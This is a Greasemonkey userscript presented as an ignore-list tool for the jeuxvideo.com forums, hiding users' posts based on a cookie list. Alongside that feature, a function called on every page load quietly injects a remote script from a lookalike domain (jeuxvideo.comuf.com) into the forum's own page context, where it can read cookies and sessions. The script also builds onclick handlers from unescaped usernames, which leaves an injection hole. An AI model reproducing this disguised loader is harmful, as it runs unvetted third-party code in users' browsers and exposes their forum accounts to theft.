// ==UserScript==
// @name           JVIgnoreV0.7
// @namespace      JVIgnoreV0.7
// @description    WorldLinx
// @include        http://www.jeuxvideo.com/forums/*
// ==/UserScript==
  function getElementsByClass(searchClass,node,tag) {
	var classElements = new Array();
	if ( node == null )
		node = document;
	if ( tag == null )
		tag = '*';
	var els = node.getElementsByTagName(tag);
	var elsLen = els.length;
	var pattern = new RegExp("(^|\\s)"+searchClass+"(\\s|$)");
	for (i = 0, j = 0; i < elsLen; i++) {
		if ( pattern.test(els[i].className) ) {
			classElements[j] = els[i];
			j++;
		}
	}
	return classElements;
}
   
  function createCookie(name,value,days) {
	if (days) {
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}

function removeElement(divNum) {

  var d = document.getElementById('bloc_forum');

  var olddiv = document.getElementById(divNum);

  d.removeChild(olddiv);

}

function getCookie(c_name)
{
var i,x,y,ARRcookies=document.cookie.split(";");
for (i=0;i<ARRcookies.length;i++)
{
  x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
  y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
  x=x.replace(/^\s+|\s+$/g,"");
  if (x==c_name)
    {
    return unescape(y);
    }
  }
}

function eraseCookie(name) {
	createCookie(name,"",-1);
} 

function wait(millis) {
var date = new Date();
var curDate = null;

do { curDate = new Date(); }
while(curDate-date < millis);
} 
  
	
   
   function CheckIfIgnore(){
   var Pseudo  = getCookie("UserList");
   if(Pseudo !="undefined" && Pseudo != undefined)
{    Pseudo = getCookie("UserList").split(",")}
   else
   {
     return;
	 }
   var i;
   var n;
   var Content = ["lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol","lol",];
   var PagePseudo = getElementsByClass("pseudo",document,"li");
   var TopicPseudo = getElementsByClass("pseudo",document,"td");
   var lol;
   var lol2;
  /* for(i=0;i<PagePseudo.length;i++)
   {
	 Content[i] = XPCNativeWrapper.unwrap(PagePseudo[i].firstChild.nextSibling.firstChild);
	 //alert(Content[i].data);
	 var divRemover = XPCNativeWrapper.unwrap(Content[i].parentNode.parentNode.parentNode.parentNode);
	 alert(divRemover.id);
	 } */
	/*if(TopicPseudo.length != 0 && TopicPseudo.length != null)
	{
      for(i=0;i<=TopicPseudo.length;i++)
	  { 
		Content[i] = TopicPseudo[i].lastChild;
		for(n=0;n<=Pseudo.length;n++)
		{
		  if(Content[i].data.toLowerCase() == Pseudo[n])
		  {
		     var trRemover = XPCNativeWrapper.unwrap(Content[i].parentNode.parentNode);
			 trRemover.parentNode.removeChild(trRemover);
		}
		}
		}
	
	} */
	if(PagePseudo.length != 0 || PagePseudo.length != null)
{
    if(Pseudo.length != 0 || Pseudo.length!= null)
   {
	 for(i=0;i<PagePseudo.length;i++)
	 {
	 Content[i] = XPCNativeWrapper.unwrap(PagePseudo[i].firstChild.nextSibling.firstChild);
	    for(n=0;n<Pseudo.length;n++)
		{ 
			 if(Pseudo[n].toLowerCase() == Content[i].data.toLowerCase())
			 {
			     //var divRemover = XPCNativeWrapper.unwrap(Content[i].parentNode.parentNode.nextSibling.nextSibling.nextSibling.nextSibling);
				 var divRemover = XPCNativeWrapper.unwrap(Content[i].parentNode.parentNode.parentNode.parentNode);
				 //alert(divRemover.innerHTML);
				 divRemover.parentNode.removeChild(divRemover);
				 //divRemover.innerHTML = "Pseudo ignoré";
			}
		}
	}
	}
	}		
	 
     
   
   }
   
   function placeIgnoreList ()
   {
      var base = document.getElementById("bloc_forums_img");
	  var listContainer = document.createElement("li");
	  var list = document.createElement("p");
	  var pseudoCookieList = new Array();
       if(getCookie("UserList")==null || getCookie("UserList")=="")
{
 return;
}
	  var pseudoCookie = getCookie("UserList").split(",");
	  listContainer.id="listContainer";
	  base.parentNode.nextSibling.nextSibling.appendChild(listContainer);
	  listContainer.appendChild(list);
	  for(i=0;i<pseudoCookie.length;i++)
	  {
	     if(pseudoCookie[i] == "" || pseudoCookie[i] == " " || pseudoCookie[i] ==",")
		 {
		 break;
		 }
	     pseudoCookieList[i] = document.createElement("a");
		 pseudoCookieList[i].textContent = pseudoCookie[i] + " (x) , ";
		 pseudoCookieList[i].setAttribute("onclick","clearThisOne('"+pseudoCookie[i]+"');");
		 list.appendChild(pseudoCookieList[i]);
		 
	   }
   
   
   }
   
    function placeStyle ()
 {
     var pseudoSpot = getElementsByClass("pseudo",document,"li"); 
	 var i;
	 var objectContainer = new Array();
	 var pseudoContainer = new Array();
	 setupScript();
	 for(i=0;i<=pseudoSpot.length;i++)
	 {
	     pseudoContainer[i] = XPCNativeWrapper.unwrap(pseudoSpot[i].firstChild.nextSibling.firstChild);
	     objectContainer[i] = document.createElement('img'); // POINTE SUR L'IMAGE
		 objectContainer[i].src = "http://s3.noelshack.com/uploads/images/259575979806_01.png";  //MISE EN PLACE DE L'IMAGE
		 objectContainer[i].style.marginLeft = "3px";
		 objectContainer[i].id = [i];
		 objectContainer[i].setAttribute("onclick","ignoreThisOne('"+pseudoContainer[i].data+"');");
		 pseudoSpot[i].firstChild.nextSibling.appendChild(objectContainer[i]);
		 }
     		 
		placeIgnoreList (); 
	}
	
	 function setupScript ()
 {
     var headID = document.getElementsByTagName("head")[0];
	 var newScript = document.createElement('script');     // MISE EN PLACE DU SCRIPT SUR DOMAINE
	 newScript.type = 'text/javascript';
     newScript.src = 'http://jeuxvideo.comuf.com/coucou.js';
     headID.appendChild(newScript);
	 
	 }

  CheckIfIgnore();
  placeIgnoreList (); 
  placeStyle ();